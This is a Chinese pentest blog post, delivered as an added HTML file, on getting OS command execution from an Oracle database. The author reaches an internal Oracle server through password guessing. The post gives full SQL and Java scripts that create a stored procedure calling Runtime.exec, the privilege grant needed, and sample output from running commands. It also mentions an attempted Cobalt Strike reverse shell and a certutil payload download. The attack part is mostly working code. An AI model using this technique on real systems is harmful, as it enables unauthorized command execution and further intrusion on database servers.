@@ -1,0 +1,177 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>通过Oracle执行系统命令 | Dayu | sCRiPt n00b</title>
+
+  
+  <meta name="author" content="大宇">
+  
+
+  
+  <meta name="description" content="不如就给自己最后一次机会，奔向或许永远无法到达的理想中，死在路上。">
+  
+
+  
+  <meta name="keywords" content="dayu,大宇,大宇的博客,网络">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="通过Oracle执行系统命令">
+
+  <meta property="og:site_name" content="Dayu">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Dayu" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Dayu</a>
+    </h1>
+    <p class="site-description">sCRiPt n00b</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/whoami">关于</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>通过Oracle执行系统命令</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/Oracle-get-os-shell.html" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-04T12:30:58.000Z">
+          2019-04-04
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>成功连接上Oracle后，如何通过Oracle get到os-shell，网上搜集资料解决后进行简单记录。</p>
+<a id="more"></a>
+<p>经历如下：内网中发现oralce em express服务，一个oracle的web管理端，碰撞密码进入后，没有找到什么getshell的点，甚至数据查询等也没有发现，无意中发现了<em>dis</em>pather设置项，通过添加dispather监听0.0.0.0后成功连接上数据库（默认的1521是监听在127.0.0.1上的）。</p>
+<h2 id="oracle提权执行命令工具oracleShell-v0-1"><a href="#oracle提权执行命令工具oracleShell-v0-1" class="headerlink" title="oracle提权执行命令工具oracleShell v0.1"></a>oracle提权执行命令工具oracleShell v0.1</h2><p>为了快速getshell，通常先去找找有没有现成的实现，找到了rebeyond师傅写的一个小工具。</p>
+<p>链接：<a href="https://www.cnblogs.com/rebeyond/p/7928887.html" target="_blank" rel="noopener">https://www.cnblogs.com/rebeyond/p/7928887.html</a></p>
+<p>环境中的oracle版本为12c，这款工具是前两年开发，集成的jdbc版本低，不支持12c新的连接协议，连接会报ORA-28547错误，11g以下的版本应该是可以使用的。</p>
+<h2 id="使用sql-plus"><a href="#使用sql-plus" class="headerlink" title="使用sql*plus"></a>使用sql*plus</h2><p>Oracle的sql*plus是与oracle进行命令行交互的客户端工具，安装oracle一般会自带。</p>
+<p>连接命令分两种（dba用户登录时带上as sysdba）：</p>
+<ol>
+<li>sqlplus 用户名/密码@ip:port/sid [as sysdba]</li>
+<li>sqlplus /nolog<br>SQL&gt; conn 用户名/密码@ip:port/sid [as sysdba]</li>
+</ol>
+<p>sqlplus自带了一个比较坑的命令host</p>
+<p>SQL&gt; host hostname</p>
+<p>你会发现显示的是你本机的机器名，原来是在本机上执行命令，而不是在连接的远程机器上，好吧。。。</p>
+<p>网上找来的方法：</p>
+<p>首先在本地新建3个sql文件，用于sqlplus连接后进行执行</p>
+<p>新建1.sql</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">create or replace and compile</span><br><span class="line">java souRCe named &quot;util&quot;</span><br><span class="line">as</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.*;</span><br><span class="line">public class util extends Object</span><br><span class="line">&#123;</span><br><span class="line">public static int RunThis(String args)</span><br><span class="line">&#123;</span><br><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">int RC = -1;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">Process p = rt.exec(args);</span><br><span class="line">int bufSize = 4096;</span><br><span class="line">BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);</span><br><span class="line">int len;</span><br><span class="line">byte buffer[] = new byte[bufSize];</span><br><span class="line">// Echo back what the program spit out</span><br><span class="line">while ((len = bis.read(buffer, 0, bufSize)) != -1)</span><br><span class="line">System.out.write(buffer, 0, len);</span><br><span class="line">RC = p.waitFor();</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">RC = -1;</span><br><span class="line">&#125;</span><br><span class="line">finally</span><br><span class="line">&#123;</span><br><span class="line">return RC;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>新建2.sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create or replace</span><br><span class="line">function run_cmd(p_cmd in varchar2) return number</span><br><span class="line">as</span><br><span class="line">language java</span><br><span class="line">name &apos;util.RunThis(java.lang.String) return integer&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>新建3.sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create or replace procedure RC(p_cmd in varChar)</span><br><span class="line">as</span><br><span class="line">x number;</span><br><span class="line">begin</span><br><span class="line">x := run_cmd(p_cmd);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure></p>
+<p>登陆上去后依次执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; @1.sql</span><br><span class="line"> 35  /</span><br><span class="line"> </span><br><span class="line">Java 已创建。</span><br><span class="line"> </span><br><span class="line">SQL&gt; @2.sql</span><br><span class="line">  6  /</span><br><span class="line"> </span><br><span class="line">函数已创建。</span><br><span class="line"> </span><br><span class="line">SQL&gt; @3.sql</span><br><span class="line">  7  /</span><br><span class="line"> </span><br><span class="line">过程已创建。</span><br><span class="line"> </span><br><span class="line">SQL&gt;</span><br><span class="line">SQL&gt; variable x number;</span><br><span class="line">SQL&gt; set serveroutput on;</span><br><span class="line">SQL&gt; exec dbms_java.set_output(100000);</span><br><span class="line">SQL&gt; grant javasyspriv to system;   [这里的system换成你的登录名,dba账户不需要执行这一步]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">PL/SQL 过程已成功完成。</span><br><span class="line"> </span><br><span class="line">SQL&gt; exec :x:=run_cmd(&apos;ipconfig&apos;);</span><br><span class="line"> </span><br><span class="line">Windows IP Configuration</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Ethernet adapter 本地连接:</span><br><span class="line"> </span><br><span class="line">Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">IP Address. . . . . . . . . . . . : 192.168.91.130</span><br><span class="line">Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">Default Gateway . . . . . . . . . : 192.168.91.1</span><br><span class="line"> </span><br><span class="line">PL/SQL 过程已成功完成。</span><br><span class="line"></span><br><span class="line">SQL&gt; exec :x:=run_cmd(&apos;whoami&apos;);    可以继续执行其他命令</span><br></pre></td></tr></table></figure>
+<p>win2003 + Oracle 11g，win2008 + Oracle 11g，win2008 + Oracle 12c 测试成功</p>
+<p>我虽然使用dba登录，比较可惜的是拿到的cmd权限还是很低，测试和非dba一样，网上的文章看到一些11g版本的测试，dba账户往往能拿到较高的权限。尝试powershell bitsadmin下载和反弹cs都没有成功（主要是因为权限低的问题），最后通过certutil下载exe成功执行。</p>
+<p>后续还要对oracle以及oracle的安全问题原理进行研究。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/xiaozi/p/6017322.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/6017322.html</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/Pentest/">Pentest</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Pentest/">Pentest</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 大宇
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-135378097-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+  </div>
+</div>
+</body>
+</html>
